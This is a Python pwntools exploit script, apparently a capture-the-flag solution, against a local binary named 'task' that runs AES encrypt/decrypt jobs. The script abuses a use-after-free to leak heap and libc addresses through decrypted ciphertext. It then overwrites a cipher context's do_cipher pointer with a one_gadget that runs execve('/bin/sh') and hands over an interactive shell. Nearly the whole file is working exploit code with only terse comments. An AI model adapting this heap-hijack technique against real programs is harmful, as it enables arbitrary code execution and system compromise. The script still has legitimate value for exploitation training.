#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import random
import struct
import os
import binascii
import sys
import time
from Crypto.Cipher import AES

# context.log_level = 'debug'
sh = process("./task")
# sh = remote('eonew.cn', 60107)
elf = ELF("./task")
libc = ELF("./libc-2.27.so")
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")



# Create a temporary file for GDB debugging
try:
    f = open('/tmp/pid', 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()
except Exception as e:
    pass

key = 'a' * 32
iv = 'b' * 16
    
def add(id, task_type, key, iv, size, data):
    sh.sendline('1')
    sh.recvuntil('Task id : ')
    sh.sendline(str(id))
    sh.recvuntil('Encrypt(1) / Decrypt(2): ')
    sh.sendline(str(task_type))
    sh.recvuntil('Key : ')
    sh.send(key)
    sh.recvuntil('IV : ')
    sh.send(iv)
    sh.recvuntil('Data Size : ')
    sh.sendline(str(size))
    sh.recvuntil('Data : ')
    sh.send(data)
    sh.recvuntil('Choice: ')

def delete(id):
    sh.sendline('2')
    sh.recvuntil('Task id : ')
    sh.sendline(str(id))
    sh.recvuntil('Choice: ')

def go(id):
    sh.sendline('3')
    sh.recvuntil('Task id : ')
    sh.sendline(str(id))
    sh.recvuntil('Choice: ')

def aes_decrypt(key, iv, data):
    aes_instance = AES.new(key, AES.MODE_CBC, iv)
    plain_text = aes_instance.decrypt(data)

    return plain_text

sh.recvuntil('Choice: ')

add(0, 1, key, iv, 0x18, '\0' * 0x18)

add(1, 1, key, iv, 0x78, '\0' * 0x78)
add(2, 1, key, iv, 0x78, '\0' * 0x78)

delete(0)
go(1)
delete(1)
delete(2)
add(3, 1, key, iv, 0x18, '\0' * 0x18)
add(4, 1, key, iv, 0x18, '\0' * 0x18)

sh.recvuntil('Ciphertext: \n')
data = sh.recvn(0x187)[:-1]
# print(data)

data_list = data.split()
raw_data = ''.join([chr(int(v, 16)) for v in data_list])

origin_data = aes_decrypt(key, iv, raw_data)

heap_addr = u64(origin_data[:8]) - 0x1280
log.success("heap_addr: " + hex(heap_addr))


# leak libc_base
add(5, 1, key, iv, 0x418, '\0' * 0x418)
go(5)
delete(5)
delete(4)

layout = [
    p64(heap_addr + 0x1ba0), # data_ptr id 8
    p64(0x18), # size
    p32(1), # type
    key,
    iv,
    '\0' * 20,
    p64(heap_addr + 0x1560), # crypto id 6
]

payload = flat(layout).ljust(0x78, '\0')
# set evp_cipher_ctx_st
add(6, 1, key, iv, 0x78, payload)

sh.recvuntil('Ciphertext: \n')
data = sh.recvn(0x61)[:-1]
print(data)

data_list = data.split()
raw_data = ''.join([chr(int(v, 16)) for v in data_list])

origin_data = aes_decrypt(key, iv, raw_data)

# your should calculate the value by yourself
libc_addr = u64(origin_data[:8]) - 0x3ebca0 # main_arena+96
log.success("libc_addr: " + hex(libc_addr))

'''
ex@Ex:~/test$ one_gadget libc-2.27.so 
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

one_gadget_addr = libc_addr + 0x10a38c
log.success("one_gadget_addr: " + hex(one_gadget_addr))

go(6)
delete(6)
delete(3)
# hijack crypto

layout = [
    p64(heap_addr + 0x1560), # crypto->cipher
    '\0' * 10,
    p64(0x10), # cipher->flag
    '\0' * 6,
    p64(one_gadget_addr), # cipher->do_cipher()
]

payload = flat(layout).ljust(0xa8, '\0')
add(7, 1, key, iv, 0xa8, payload)

time.sleep(2)

sh.interactive()